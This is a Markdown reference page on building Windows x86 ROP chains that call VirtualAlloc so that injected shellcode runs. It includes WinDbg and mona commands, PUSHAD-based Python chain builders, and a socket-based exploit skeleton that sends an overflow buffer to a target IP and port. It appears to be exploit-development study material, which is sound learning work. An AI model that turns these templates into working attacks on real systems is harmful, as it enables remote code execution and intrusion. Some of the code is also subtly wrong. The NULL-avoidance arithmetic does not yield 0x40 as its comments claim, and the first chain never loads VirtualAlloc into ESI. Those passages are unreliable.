---
tags:
  - Advanced
  - Binary_Exploitation
  - Debugging
  - Exploitation
  - ROP
  - WinDbg
  - Windows
---

## VirtualAlloc ROP Chain
resources: [Microsoft VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)

> Build ROP chain to call VirtualAlloc and execute shellcode.

### VirtualAlloc Prototype [Knowledge]
> Function signature for VirtualAlloc call.

```c
LPVOID VirtualAlloc(
    LPVOID lpAddress,        // Desired address (NULL = any)
    SIZE_T dwSize,           // Size to allocate
    DWORD  flAllocationType, // MEM_COMMIT | MEM_RESERVE (0x3000)
    DWORD  flProtect         // PAGE_EXECUTE_READWRITE (0x40)
);
```

### Find VirtualAlloc Address
> Locate VirtualAlloc in IAT or dynamically.

```text
0:000> x kernel32!VirtualAlloc
0:000> dps <ModuleBase>+<IATOffset>    ; Check IAT

; Using mona
!mona iat -m <Module>                   ; List IAT entries
```

### Mona ROP Chain Generation
> Auto-generate VirtualAlloc chain.

```text
!mona rop -m <Module> -cpb "\x00"
```

> Creates rop_chains.txt with Python/Ruby/JavaScript payloads.

### Manual Chain Strategy [Knowledge]
> [!info] Steps to build VirtualAlloc ROP chain:
> 1. Set up stack with VirtualAlloc arguments
> 2. Call VirtualAlloc (returns RWX memory address in EAX)
> 3. Copy shellcode to allocated memory
> 4. Jump to shellcode

> [!tip] **Alternative (PUSHAD method)**:
> 1. Set registers: EAX=NOP, ECX=flProtect, EDX=flAllocationType, EBX=dwSize, EBP=ReturnAddr, ESI=VirtualAlloc, EDI=ROP NOP
> 2. PUSHAD creates stack frame
> 3. Call VirtualAlloc via ESI

### PUSHAD Stack Frame [Knowledge]
> How PUSHAD arranges registers on stack.

```text
PUSHAD pushes in order: EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI

After PUSHAD, stack looks like:
+------------------+
| EDI              | <-- ESP (return to ROP NOP sled)
+------------------+
| ESI              |     (VirtualAlloc address)
+------------------+
| EBP              |     (return addr after VirtualAlloc)
+------------------+
| ESP (original)   |     (lpAddress - use stack address)
+------------------+
| EBX              |     (dwSize)
+------------------+
| EDX              |     (flAllocationType - 0x3000)
+------------------+
| ECX              |     (flProtect - 0x40)
+------------------+
| EAX              |     (NOP padding)
+------------------+
```

### Build PUSHAD-Based Chain
> ROP chain using PUSHAD technique.

```python
import struct

def p32(addr):
    return struct.pack("<I", addr)

# Gadget addresses (adjust for target)
POP_EAX = 0x10001000
POP_ECX = 0x10001004
POP_EDX = 0x10001008
POP_EBX = 0x1000100c
POP_EBP = 0x10001010
POP_ESI = 0x10001014
POP_EDI = 0x10001018
PUSHAD = 0x1000101c
VIRTUALALLOC_IAT = 0x10002000  # Pointer to VirtualAlloc
MOV_EAX_DWORD_EAX = 0x10001020  # mov eax, [eax]; ret

# Build ROP chain
rop = b""

# EAX = NOP (will be at bottom of PUSHAD frame)
rop += p32(POP_EAX)
rop += p32(0x90909090)

# ECX = flProtect (0x40 = PAGE_EXECUTE_READWRITE)
rop += p32(POP_ECX)
rop += p32(0x00000040)

# EDX = flAllocationType (0x3000 = MEM_COMMIT | MEM_RESERVE)
rop += p32(POP_EDX)
rop += p32(0x00003000)

# EBX = dwSize (0x1000 = 4096 bytes)
rop += p32(POP_EBX)
rop += p32(0x00001000)

# EBP = return address (points to shellcode after VirtualAlloc)
rop += p32(POP_EBP)
rop += p32(0x41414141)  # Placeholder - adjust at runtime

# ESI = VirtualAlloc address (dereference IAT)
rop += p32(POP_EAX)
rop += p32(VIRTUALALLOC_IAT)
rop += p32(MOV_EAX_DWORD_EAX)  # EAX = [VirtualAlloc]
# Need gadget to move EAX to ESI

# EDI = ROP NOP (ret gadget for slide)
rop += p32(POP_EDI)
rop += p32(0x10001024)  # Simple RET gadget

# Execute PUSHAD and call
rop += p32(PUSHAD)
```

### Handle NULL Bytes in Parameters
> Build values without NULL bytes.

```python
# 0x40 contains NULLs - build via arithmetic
# Use: 0xFFFFFFBF + 0x00000081 = 0x100000040 (truncated to 0x40)
rop += p32(POP_EAX)
rop += p32(0xFFFFFFBF)  # -65 (no NULLs)
rop += p32(POP_ECX)
rop += p32(0x01010181)  # Will add to EAX
rop += p32(ADD_EAX_ECX)
# EAX now contains 0x40

# Or use NEG:
rop += p32(POP_EAX)
rop += p32(0xFFFFFFBF)  # -65 in two's complement
rop += p32(NEG_EAX)
# Need to add 1 if using NEG for 0x40
```

### Calculate Return Address
> Determine where shellcode lands.

```text
; After VirtualAlloc returns:
; - EAX contains address of allocated RWX memory
; - Need to copy shellcode there
; - Or: use stack address as lpAddress, shellcode already there

Strategy 1: Allocate at NULL (any address)
- VirtualAlloc returns address in EAX
- Copy shellcode to EAX
- JMP EAX

Strategy 2: Allocate at stack
- lpAddress = ESP at time of call
- Stack becomes executable
- Return directly to shellcode on stack
```

### Stack-Based VirtualAlloc Chain
> Make stack executable, jump to shellcode.

```python
# Simpler approach: make current stack executable
# lpAddress = current ESP value

rop = b""

# Get current ESP into a register
# Need creative gadget use since we can't directly read ESP

# Alternative: Use VirtualProtect instead
# Changes existing memory permissions
```

### Complete Exploit Structure
> Full exploit with ROP chain.

```python
import struct
import socket

def p32(addr):
    return struct.pack("<I", addr)

# Gadgets (from target binary)
GADGETS = {
    'pop_eax': 0x10001000,
    'pop_ecx': 0x10001004,
    'pop_edx': 0x10001008,
    'pop_ebx': 0x1000100c,
    'pop_ebp': 0x10001010,
    'pop_esi': 0x10001014,
    'pop_edi': 0x10001018,
    'pushad': 0x1000101c,
    'ret': 0x10001024,
}

VIRTUALALLOC = 0x10002000

# Shellcode
shellcode = b"\xcc" * 100  # INT3 for testing

# Build ROP chain
def build_rop():
    rop = b""
    # ... (add gadgets as above)
    return rop

# Build exploit
offset = 260  # Offset to EIP
buffer = b"A" * offset
buffer += build_rop()
buffer += b"\x90" * 16  # NOP sled
buffer += shellcode

# Send exploit
s = socket.socket()
s.connect(("<TargetIP>", <Port>))
s.send(buffer)
s.close()
```

### Debug ROP Chain
> Verify chain execution step by step.

```text
0:000> bp <FirstGadget>
0:000> g
0:000> p                    ; Step through each gadget
0:000> r                    ; Verify register values
0:000> dd esp L10           ; Check stack layout
```

### Common Issues [Knowledge]
> [!warning] Troubleshooting ROP chains:
> - **Chain breaks early**: Gadget has unexpected side effects, corrupts stack
> - **Wrong values in registers**: Gadget order incorrect, extra POPs
> - **Access violation**: Bad gadget address, address contains NULLs
> - **VirtualAlloc fails**: Invalid parameters, check return value

